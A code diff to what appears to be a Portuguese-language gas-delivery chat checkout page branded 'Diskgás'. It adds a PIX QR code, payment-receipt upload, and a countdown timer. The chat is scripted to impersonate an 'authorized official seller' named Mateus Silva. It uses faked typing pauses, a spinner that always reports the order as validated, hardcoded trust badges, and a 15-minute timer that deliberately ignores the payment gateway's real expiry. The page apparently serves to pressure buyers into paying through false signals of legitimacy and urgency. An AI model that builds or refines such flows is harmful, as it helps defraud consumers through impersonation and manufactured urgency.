@@ -139,6 +139,7 @@ const orderInfo = window.ORDER ? `\n--- Dados do Pedido ---\nNome: ${window.ORDE
 }
 </script>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&family=JetBrains+Mono:wght@600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 
@@ -789,6 +790,73 @@ html,body{
 .pix-trust-item.positive { color: var(--green-dk); }
 .pix-trust-item.neutral { color: var(--text-3); justify-content: flex-end; }
 
+.pix-qr-section {
+  background: #FAFBFC;
+  border: 1.5px solid var(--border-2);
+  border-radius: 14px;
+  padding: 16px;
+  margin-bottom: 12px;
+  text-align: center;
+}
+.pix-qr-section-title {
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--text-3);
+  text-transform: uppercase;
+  letter-spacing: .8px;
+  margin-bottom: 10px;
+}
+.pix-qr-code {
+  margin: 0 auto;
+  border-radius: 10px;
+  overflow: hidden;
+  display: inline-block;
+  background: #fff;
+  padding: 8px;
+  box-shadow: 0 2px 8px rgba(0,0,0,.06);
+}
+.pix-qr-code canvas {
+  display: block;
+  width: 180px !important;
+  height: 180px !important;
+}
+.pix-qr-divider {
+  width: 60%;
+  height: 1px;
+  background: var(--border-2);
+  margin: 10px auto;
+}
+.pix-qr-or-text {
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--text-3);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+.pix-timer {
+  font-size: 13px;
+  font-weight: 700;
+  color: #EF4444;
+  font-family: 'JetBrains Mono', monospace;
+}
+.pix-timer.warning { color: #F59E0B; }
+.pix-timer.danger { color: #EF4444; animation: pulse-timer 1s infinite; }
+@keyframes pulse-timer {
+  0%, 100% { opacity: 1; }
+  50% { opacity: .5; }
+}
+.pix-code-selectable {
+  user-select: text !important;
+  cursor: text !important;
+  padding: 6px 8px;
+  border: 1px dashed var(--border-2);
+  border-radius: 8px;
+  font-size: 11px !important;
+  line-height: 1.6 !important;
+  white-space: normal !important;
+  word-break: break-all !important;
+}
+
 /* ── SELLER MODAL ── */
 .seller-modal-overlay{
   position:absolute;inset:0;background:rgba(0,0,0,.4);
@@ -967,6 +1035,112 @@ html,body{
   white-space: nowrap;
 }
 
+/* ── FILE UPLOAD ── */
+.file-upload-btn {
+  width:36px;height:36px;border-radius:50%;
+  background:transparent;color:var(--text-3);
+  border:none;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+  margin-bottom:3px;flex-shrink:0;
+  transition:all .2s var(--spring);
+}
+.file-upload-btn:hover{color:var(--brand);background:var(--brand-lt);}
+.file-upload-btn:active{transform:scale(.9);}
+.file-upload-btn svg{pointer-events:none;}
+
+.bubble-attachment{margin-top:6px;border-radius:8px;overflow:hidden;}
+.bubble-attachment img{max-width:100%;max-height:200px;display:block;border-radius:8px;cursor:pointer;}
+.bubble-attachment-pdf{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,.08);padding:8px 10px;border-radius:8px;font-size:12px;font-weight:600;}
+.bubble-attachment-pdf svg{flex-shrink:0;}
+
+#receiptFileInput{display:none;}
+
+/* ── RECEIPT MODAL ── */
+.receipt-modal-overlay{
+  position:absolute;inset:0;background:rgba(0,0,0,.55);
+  z-index:1050;display:none;align-items:flex-end;justify-content:center;
+  backdrop-filter:blur(8px);
+}
+.receipt-modal-overlay.on{display:flex;}
+.receipt-modal{
+  width:100%;max-width:430px;background:#fff;
+  border-radius:24px 24px 0 0;padding:28px 24px 24px;
+  box-shadow:0 -12px 40px rgba(0,0,0,.18);
+  animation:slideUp .4s var(--spring);
+  text-align:center;
+}
+.receipt-modal-icon{
+  width:64px;height:64px;border-radius:50%;
+  background:linear-gradient(135deg,var(--brand-lt) 0%,#dbeafe 100%);
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 16px;
+  box-shadow:0 4px 16px rgba(15,91,168,.15);
+}
+.receipt-modal-icon svg{color:var(--brand);width:30px;height:30px;}
+.receipt-modal-title{font-size:17px;font-weight:700;color:var(--text);margin-bottom:8px;}
+.receipt-modal-desc{font-size:13px;color:var(--text-3);margin-bottom:22px;line-height:1.55;}
+.receipt-modal-btn{
+  width:100%;padding:15px;border-radius:14px;
+  background:linear-gradient(135deg,var(--brand) 0%,var(--brand-mid) 100%);color:#fff;border:none;
+  font-weight:700;font-size:14.5px;cursor:pointer;
+  box-shadow:0 4px 18px rgba(15,91,168,.3);
+  transition:all .25s ease;margin-bottom:10px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  letter-spacing:.3px;
+}
+.receipt-modal-btn:hover{background:linear-gradient(135deg,var(--brand-mid) 0%,#2596d9 100%);transform:translateY(-1px);box-shadow:0 6px 22px rgba(15,91,168,.38);}
+.receipt-modal-btn:active{transform:scale(.97);}
+.receipt-modal-cancel{
+  width:100%;padding:12px;border-radius:12px;
+  background:transparent;color:var(--text-3);border:none;
+  font-weight:600;font-size:13px;cursor:pointer;
+  transition:all .2s ease;
+}
+.receipt-modal-cancel:hover{background:var(--surface-2);color:var(--text-2);}
+.receipt-modal-formats{
+  margin-top:16px;padding-top:14px;border-top:1px solid var(--border-2);
+  display:flex;justify-content:center;gap:10px;
+}
+.receipt-format-tag{
+  font-size:10px;font-weight:700;color:var(--text-3);
+  text-transform:uppercase;letter-spacing:.8px;
+  background:var(--surface-2);padding:4px 10px;border-radius:6px;
+}
+.receipt-modal-divider{
+  width:100%;height:1px;background:var(--border-2);margin:6px 0;
+}
+
+/* ── RECEIPT MODAL CLOSE BUTTON ── */
+.receipt-modal-close{
+  position:absolute;top:14px;right:14px;
+  width:32px;height:32px;border-radius:50%;
+  background:var(--surface-2);border:none;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;transition:all .2s ease;
+  color:var(--text-3);padding:0;
+}
+.receipt-modal-close:hover{background:var(--surface-3);color:var(--text-2);transform:scale(1.05);}
+.receipt-modal-close:active{transform:scale(.95);}
+.receipt-modal-close svg{width:18px;height:18px;}
+.receipt-modal{position:relative;}
+
+/* ── RECEIPT REMINDER BUTTON ── */
+.receipt-reminder-btn{
+  display:inline-flex;align-items:center;gap:5px;
+  margin-top:8px;padding:9px 14px;
+  background:var(--brand);color:#fff;border:none;
+  border-radius:10px;font-size:12px;font-weight:700;
+  cursor:pointer;transition:all .2s ease;
+  box-shadow:0 2px 8px rgba(15,91,168,.2);
+  line-height:1;
+}
+.receipt-reminder-btn:hover{background:var(--brand-mid);transform:translateY(-1px);box-shadow:0 4px 12px rgba(15,91,168,.28);}
+.receipt-reminder-btn:active{transform:scale(.96);}
+.receipt-reminder-btn svg{flex-shrink:0;}
+.delivery-receipt-btn{display:inline-flex;align-items:center;gap:5px;margin-top:8px;padding:9px 14px;background:var(--brand);color:#fff;border:none;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s ease;box-shadow:0 2px 8px rgba(15,91,168,.2);line-height:1;}
+.delivery-receipt-btn:hover{background:var(--brand-mid);transform:translateY(-1px);box-shadow:0 4px 12px rgba(15,91,168,.28);}
+.delivery-receipt-btn:active{transform:scale(.96);}
+.delivery-receipt-btn svg{flex-shrink:0;}
 
 </style>
 </head>
@@ -1041,13 +1215,43 @@ html,body{
 
   <!-- FOOTER -->
   <footer class="footer">
+    <input type="file" id="receiptFileInput" accept="image/jpeg,image/png,image/jpg,image/gif,image/webp,application/pdf" multiple>
     <div class="input-wrap" id="inputWrap">
       <textarea class="input-el" id="msgInput" placeholder="Digite uma mensagem..." rows="1"></textarea>
     </div>
+    <button class="file-upload-btn" id="fileUploadBtn" aria-label="Enviar comprovante" title="Enviar comprovante">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l8.57-8.57A4 4 0 1 1 18 8.84l-8.59 8.57a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg>
+    </button>
     <button class="send-btn" id="sendBtn" disabled aria-label="Enviar">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polyline points="22 2 15 22 11 13 2 9 22 2"/></svg>
     </button>
   </footer>
+
+
+
+  <!-- RECEIPT MODAL -->
+  <div class="receipt-modal-overlay" id="receiptModalOverlay">
+    <div class="receipt-modal">
+      <div class="modal-handle"></div>
+      <button class="receipt-modal-close" id="receiptModalCloseBtn" onclick="receiptModalOverlay.classList.remove('on')">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+      <div class="receipt-modal-icon">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+      </div>
+      <div class="receipt-modal-title">Enviar Comprovante</div>
+      <div class="receipt-modal-desc">Envie o comprovante de pagamento. Após o envio a entrega será liberada rapidamente.</div>
+      <button class="receipt-modal-btn" id="receiptModalSelectBtn">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+        Enviar Comprovante
+      </button>
+      <button class="receipt-modal-cancel" id="receiptModalCancelBtn">Cancelar</button>
+      <div class="receipt-modal-formats">
+        <span class="receipt-format-tag">DISKGÁS</span>
+        <span class="receipt-format-tag">ENTREGAS</span>
+      </div>
+    </div>
+  </div>
 
   <!-- ORDER MODAL -->
   <div class="modal-overlay" id="modalOverlay">
@@ -1293,7 +1497,7 @@ const ORDER = parseOrderData();
 function buildPixItems() {
   if (!Array.isArray(ORDER.products) || ORDER.products.length === 0) {
     return [{
-      title: ORDER.productName || 'Pedido Diskgás',
+      title: ORDER.productName || 'Pedido',
       unitPrice: Math.round(Number(ORDER.productPrice) * 100),
       quantity: 1
     }];
@@ -1333,7 +1537,10 @@ async function requestPixCode() {
     }
 
     window._currentPixTransactionId = data.transactionId || null;
-    window._currentPixExpiresAt = data.expiresAt || null;
+    // O cronômetro exibido no card é sempre local e fixo em 15 minutos.
+    // A data do gateway fica separada apenas para referência futura.
+    window._currentPixProviderExpiresAt = data.expiresAt || null;
+    window._currentPixExpiresAt = null;
     return data.pixCode;
   })();
 
@@ -1496,6 +1703,166 @@ inputEl.addEventListener('keydown', e => { if(e.key==='Enter'&&!e.shiftKey){e.pr
 sendBtnEl.addEventListener('mousedown', e => { if (inputEl.value.trim()) e.preventDefault(); });
 sendBtnEl.addEventListener('click', () => doSend());
 
+// ── FILE UPLOAD ──────────────────────────────────────
+const receiptFileInput = document.getElementById('receiptFileInput');
+const fileUploadBtn = document.getElementById('fileUploadBtn');
+const receiptModalOverlay = document.getElementById('receiptModalOverlay');
+const receiptModalSelectBtn = document.getElementById('receiptModalSelectBtn');
+const receiptModalCancelBtn = document.getElementById('receiptModalCancelBtn');
+
+// Clicar no ícone de clipe → abre o modal
+fileUploadBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  receiptModalOverlay.classList.add('on');
+});
+
+// Clicar em "Selecionar Arquivo" dentro do modal → abre o seletor
+receiptModalSelectBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  receiptModalOverlay.classList.remove('on');
+  receiptFileInput.value = '';
+  receiptFileInput.click();
+});
+
+// Cancelar modal
+receiptModalCancelBtn.addEventListener('click', () => {
+  receiptModalOverlay.classList.remove('on');
+});
+
+// Clicar fora do modal → fechar
+receiptModalOverlay.addEventListener('click', (e) => {
+  if (e.target === receiptModalOverlay) {
+    receiptModalOverlay.classList.remove('on');
+  }
+});
+
+receiptFileInput.addEventListener('change', async (e) => {
+  const file = e.target.files[0];
+  if (!file) return;
+  
+  // Validate size (10 MB)
+  if (file.size > 10 * 1024 * 1024) {
+    addSys('Arquivo muito grande. Tamanho máximo: 10 MB.', 'gold');
+    receiptFileInput.value = '';
+    return;
+  }
+
+  receiptFileInput.value = '';
+
+  // Show message in chat immediately
+  const fileExt = file.name.split('.').pop().toLowerCase();
+  const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(fileExt);
+  let attachmentHtml = '';
+
+  if (isImage) {
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      const dataUrl = ev.target.result;
+      attachmentHtml = `<div class="bubble-attachment"><img src="${dataUrl}" alt="Comprovante" onclick="window.open('${dataUrl}','_blank')"></div>`;
+      row.querySelector('.bubble').insertAdjacentHTML('beforeend', attachmentHtml);
+      scrollDown();
+    };
+    reader.readAsDataURL(file);
+  } else {
+    attachmentHtml = `<div class="bubble-attachment bubble-attachment-pdf"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg><span>📄 ${file.name}</span></div>`;
+  }
+
+  const row = document.createElement('div');
+  row.className = 'row user';
+  row.innerHTML = `<div class="bubble u">📎 Comprovante enviado<div class="b-meta"><span class="b-time">${ts()}</span><span class="b-read sending">✓</span></div>${attachmentHtml}</div>`;
+  msgsEl.appendChild(row);
+  lastSender = 'user';
+  scrollDown();
+
+  // Animate read receipt
+  const readEl = row.querySelector('.b-read');
+  setTimeout(() => { readEl.textContent = '✓✓'; readEl.className = 'b-read sent'; }, 700);
+  setTimeout(() => { readEl.className = 'b-read read'; }, 2000);
+
+  // Upload to server and notify admin
+  const formData = new FormData();
+  formData.append('file', file);
+  formData.append('userId', userId);
+  formData.append('sender', 'Cliente');
+
+  console.log('Enviando comprovante para servidor:', file.name, file.size, 'bytes');
+
+  let uploaded = false;
+  let serverAttachment = null;
+
+  try {
+    const res = await fetch('/api/upload-receipt', { method: 'POST', body: formData });
+    const data = await res.json();
+    console.log('Resposta do servidor:', data);
+    if (data.success && data.attachment) {
+      uploaded = true;
+      serverAttachment = data.attachment;
+      // Store attachment info in the DOM for localStorage persistence
+      row.dataset.attachmentUrl = data.attachment.url;
+      row.dataset.attachmentFilename = data.attachment.filename;
+      row.dataset.attachmentMimetype = data.attachment.mimetype;
+      row.dataset.attachmentServerFilename = data.attachment.serverFilename;
+    }
+  } catch (err) {
+    console.error('Erro no upload:', err);
+  }
+
+  // EMITIR PARA ADMIN VIA SOCKET (independente do fetch)
+  // Se o fetch falhou, envia sem attachment (apenas aviso)
+  const attachmentToSend = serverAttachment || {
+    url: '',
+    filename: file.name,
+    mimetype: file.type,
+    size: file.size,
+    serverFilename: ''
+  };
+
+  socket.emit('send_message', {
+    userId: userId,
+    text: `📎 Comprovante enviado: ${file.name}`,
+    sender: 'Cliente',
+    isAuto: false,
+    attachment: attachmentToSend
+  });
+  console.log('Comprovante emitido via socket para admin');
+
+  if (uploaded) {
+    saveChatHistory();
+
+    // START TIMER: 5 minutes after receipt upload
+    if (!window._receiptTimerStarted) {
+      window._receiptTimerStarted = true;
+      localStorage.setItem('dg_receipt_timer', Date.now().toString());
+    }
+
+    // MENSAGEM PÓS-COMPROVANTE: prazo de entrega + botão de enviar comprovante
+    if (!window._receiptDeliveryMsgSent) {
+      window._receiptDeliveryMsgSent = true;
+      saveChatHistory();
+      setTimeout(async () => {
+        await agentSay('O prazo de entrega é de 20-30 minutos. 😃', true, true);
+        // Adiciona botão de enviar comprovante logo abaixo da mensagem
+        setTimeout(() => {
+          const lastBubble = msgsEl.querySelector('.row.agent:last-child .bubble.a');
+          if (lastBubble && !lastBubble.querySelector('.delivery-receipt-btn')) {
+            const btn = document.createElement('button');
+            btn.className = 'delivery-receipt-btn';
+            btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Enviar Comprovante';
+            btn.onclick = () => { receiptModalOverlay.classList.add('on'); };
+            const metaEl = lastBubble.querySelector('.b-meta');
+            if (metaEl) {
+              metaEl.parentElement.insertBefore(btn, metaEl);
+            } else {
+              lastBubble.appendChild(btn);
+            }
+          }
+        }, 300);
+        saveChatHistory();
+      }, 300);
+    }
+  }
+});
+
 // ── MESSAGES ─────────────────────────────────────────
 function addMsg(text, type, newGroup=false, saveToStorage=true, emitToSocket=true) {
   const isGrouped = !newGroup && lastSender===type;
@@ -1543,7 +1910,11 @@ function saveChatHistory() {
     pixCopyClicked: window._pixCopyClicked || false,
         pixCopyReminderSent: window._pixCopyReminderSent || false,
     pixPaymentReminderSent: window._pixPaymentReminderSent || false,
-    orderConfirmationShown: window._orderConfirmationShown || false
+    orderConfirmationShown: window._orderConfirmationShown || false,
+    receiptReminder1Sent: window._receiptReminder1Sent || false,
+    receiptReminder2Sent: window._receiptReminder2Sent || false,
+    receiptDeliveryMsgSent: window._receiptDeliveryMsgSent || false,
+    pixExpiresAt: window._currentPixExpiresAt || null
   };
   localStorage.setItem(STATE_STORAGE_KEY, JSON.stringify(state));
 }
@@ -1724,16 +2095,77 @@ function showOrderConfirmation() {
 
 
 // ── DELIVERY STEPS / PIX ─────────────────────────────
-function showDeliverySteps(pixCode) {
+const PIX_CARD_DURATION_SECONDS = 15 * 60;
+
+function markPixCardExpired(card) {
+  const timerDisplay = card && card.querySelector('#pixTimerDisplay');
+  if (timerDisplay) {
+    timerDisplay.textContent = 'Expirado';
+    timerDisplay.className = 'pix-timer danger';
+  }
+
+  const copyBtn = card && card.querySelector('#pixCopyBtn');
+  if (copyBtn) {
+    copyBtn.disabled = true;
+    copyBtn.style.opacity = '0.5';
+    copyBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg> PIX expirado';
+  }
+}
+
+function startPixCardCountdown(card, expiryMs) {
+  const timerDisplay = card && card.querySelector('#pixTimerDisplay');
+  if (!timerDisplay) return;
+
+  if (card._pixTimerInterval) clearInterval(card._pixTimerInterval);
+
+  const updateTimer = () => {
+    const remainingSeconds = Math.max(0, Math.ceil((expiryMs - Date.now()) / 1000));
+    if (remainingSeconds <= 0) {
+      clearInterval(card._pixTimerInterval);
+      card._pixTimerInterval = null;
+      markPixCardExpired(card);
+      return;
+    }
+
+    timerDisplay.textContent = formatExpiryTime(remainingSeconds);
+    timerDisplay.className = remainingSeconds <= 60
+      ? 'pix-timer danger'
+      : remainingSeconds <= 180
+        ? 'pix-timer warning'
+        : 'pix-timer';
+  };
+
+  updateTimer();
+  if (expiryMs > Date.now()) {
+    card._pixTimerInterval = setInterval(updateTimer, 1000);
+  }
+}
+
+function getPixCardExpiryMs() {
+  const savedExpiryMs = new Date(window._currentPixExpiresAt || '').getTime();
+  // Se já existe um prazo salvo, inclusive vencido, nunca reinicia o mesmo PIX.
+  if (Number.isFinite(savedExpiryMs)) return savedExpiryMs;
+  return Date.now() + PIX_CARD_DURATION_SECONDS * 1000;
+}
+
+function showDeliverySteps(pixCode, expiresAt) {
   const card = document.createElement('div');
   card.className = 'pix-card';
-  card.innerHTML = `
+
+  // O card usa sempre uma janela local fixa de 15 minutos.
+  // Isso garante o funcionamento mesmo quando o gateway não envia expiresAt.
+  const expiryMs = getPixCardExpiryMs();
+  window._currentPixExpiresAt = new Date(expiryMs).toISOString();
+  const totalSeconds = Math.max(0, Math.ceil((expiryMs - Date.now()) / 1000));
+  
+  // Build HTML with conditional QR section
+  let html = `
     <div class="pix-card-header">
       <div class="pix-brand-mark">
         <div class="pix-logo">PIX</div>
         <div><div class="pix-brand-label">Pagamento Instantâneo</div><div class="pix-brand-sub">Diskgas Oficial</div></div>
       </div>
-      <div class="pix-expiry"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> 15:00</div>
+      <div class="pix-expiry"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> <span class="pix-timer" id="pixTimerDisplay">${formatExpiryTime(totalSeconds)}</span></div>
     </div>
     <div class="pix-price-hero">
       <div class="pix-price-eyebrow">Valor do pedido</div>
@@ -1742,29 +2174,91 @@ function showDeliverySteps(pixCode) {
     <div style="background:#F0FDF4;border:1px solid rgba(16,185,129,.22);border-radius:12px;padding:11px 14px;margin-bottom:14px;display:flex;align-items:center;gap:11px;cursor:pointer;" onclick="openSellerModal()">
       <div style="width:34px;height:34px;background:var(--green);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 3px 8px rgba(16,185,129,.25);"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
       <div><div style="font-size:10px;font-weight:700;color:#065F46;text-transform:uppercase;letter-spacing:.6px;margin-bottom:2px;">Vendedor Autorizado</div><div style="font-size:13px;font-weight:700;color:var(--text);line-height:1.2;">Mateus Silva.</div><div style="font-size:10.5px;color:var(--text-3);margin-top:2px;">Vendedor Oficial · Diskgás</div></div>
-    </div>
-    <div class="pix-code-row"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--text-3)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><div class="pix-code-text">${pixCode.substring(0,40)}…</div></div>
+    </div>`;
+  
+  // Only add QR Code section if QRCode library is available
+  if (typeof QRCode !== 'undefined') {
+    html += `
+    <div class="pix-qr-section">
+      <div class="pix-qr-section-title">Escaneie o QR Code</div>
+      <div class="pix-qr-code"><div id="pixQrCanvas"></div></div>
+      <div class="pix-qr-divider"></div>
+      <div class="pix-qr-or-text">Ou copie o código</div>
+    </div>`;
+  }
+  
+  html += `
+    <div class="pix-code-row"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--text-3)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><div class="pix-code-text" id="pixCodeText">${pixCode.substring(0,40)}…</div></div>
     <button class="pix-copy-btn" id="pixCopyBtn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix</button>
     <div class="pix-trust-row"><div class="pix-trust-item positive"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Seguro</div><div class="pix-trust-item neutral"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Pagamento seguro</div></div>
   `;
+  
+  card.innerHTML = html;
   msgsEl.appendChild(card);
   scrollDown();
+  
+  // Generate QR Code only if library is available
+  if (typeof QRCode !== 'undefined') {
+    const qrContainer = card.querySelector('#pixQrCanvas');
+    if (qrContainer) {
+      QRCode.toCanvas(qrContainer, pixCode, { width: 180, margin: 1, color: { dark: '#000000', light: '#FFFFFF' } }, function(err) {
+        if (err) {
+          console.warn('Erro ao gerar QR Code:', err);
+          // Hide QR section if generation failed
+          const qrSection = card.querySelector('.pix-qr-section');
+          if (qrSection) qrSection.style.display = 'none';
+        }
+      });
+    }
+  }
+  
+  // Store pixCode for copy
+  card._pixCode = pixCode;
+  
+  // O contador é iniciado sempre, inclusive quando expiresAt do gateway é nulo.
+  startPixCardCountdown(card, expiryMs);
+  saveChatHistory();
+  
+  // Robust copy button
   const copyBtn = card.querySelector('#pixCopyBtn');
   if (copyBtn) {
     copyBtn.onclick = () => {
       window._pixCopyClicked = true;
       if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
-      navigator.clipboard.writeText(pixCode).catch(()=>{});
-      copyBtn.classList.add('copied');
-      copyBtn.style.background = '#10B981';
-      copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
-      setTimeout(()=>{
-        copyBtn.classList.remove('copied');
-        copyBtn.style.background = 'var(--brand)';
-        copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
-      }, 2500);
+      
+      navigator.clipboard.writeText(pixCode).then(() => {
+        copyBtn.classList.add('copied');
+        copyBtn.style.background = '#10B981';
+        copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
+        setTimeout(()=>{
+          copyBtn.classList.remove('copied');
+          copyBtn.style.background = 'var(--brand)';
+          copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
+        }, 2500);
+      }).catch(() => {
+        const codeText = card.querySelector('#pixCodeText');
+        if (codeText) {
+          codeText.classList.add('pix-code-selectable');
+          codeText.textContent = pixCode;
+          const range = document.createRange();
+          range.selectNodeContents(codeText);
+          const sel = window.getSelection();
+          sel.removeAllRanges();
+          sel.addRange(range);
+        }
+        copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg> Selecione o código acima`;
+        setTimeout(()=>{
+          copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
+        }, 3500);
+      });
     };
   }
+}
+
+function formatExpiryTime(totalSeconds) {
+  const m = Math.floor(totalSeconds / 60);
+  const s = totalSeconds % 60;
+  return m.toString().padStart(2, '0') + ':' + s.toString().padStart(2, '0');
 }
 
 // ── TYPING STATE ─────────────────────────────────────
@@ -1826,7 +2320,7 @@ await agentSay(`Sou Mateus, vendedor autorizado Diskgas em ${ORDER.location} e R
   if (window._currentFlowStep === 4) {
     window._currentFlowStep = 5; saveChatHistory();
     const spVal = addSpinner("Validando dados do pedido...");
-    await pause(3500); spVal.remove();
+    await pause(2000); spVal.remove();
     addSys('Pedido validado com sucesso', 'ok');
   }
   if (window._currentFlowStep === 5) {
@@ -1834,7 +2328,7 @@ await agentSay(`Sou Mateus, vendedor autorizado Diskgas em ${ORDER.location} e R
     const localBase = ORDER.location || 'sua região';
     const localFinal = localBase === 'sua região' ? localBase : `${localBase} e região`;
     await agentSay(`Certo, já vou enviar o pix, um segundo...`);
-    await pause(900); setTyping(true); await pause(5500); setTyping(false);
+    await pause(900); setTyping(true); await pause(2500); setTyping(false);
 await addMsg(`Me chamo 𝗠𝗮𝘁𝗲𝘂𝘀 𝗦𝗶𝗹𝘃𝗮, sou o vendedor diskgás oficial em ${ORDER.location} e região, serei responsável pela sua entrega 😃`, 'agent', true);
     await pause(600);
   }
